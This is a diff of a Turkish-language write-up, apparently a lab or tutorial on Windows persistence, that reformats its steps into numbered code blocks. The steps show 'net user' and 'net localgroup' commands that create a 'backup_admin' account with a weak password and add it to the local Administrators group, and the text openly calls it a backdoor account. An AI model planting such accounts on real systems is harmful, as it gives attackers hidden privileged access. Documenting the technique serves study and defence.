@@ -5,9 +5,11 @@
 ## Uygulama (Windows Komut Satırı)
 Yetkili bir komut satırı kullanarak, arka kapı (backdoor) hesabı oluşturmak için `net user` ve `net localgroup` komutlarını çalıştırdım.
 
+1. 'backup_admin' adında yeni bir kullanıcı oluştur
 ```cmd
-# 1. 'backup_admin' adında yeni bir kullanıcı oluştur
 net user backup_admin Password123! /add
-
-# 2. Kullanıcıyı yerel Administrators grubuna ekle
+```
+2. Kullanıcıyı yerel Administrators grubuna ekle
+```cmd
 net localgroup Administrators backup_admin /add
+```
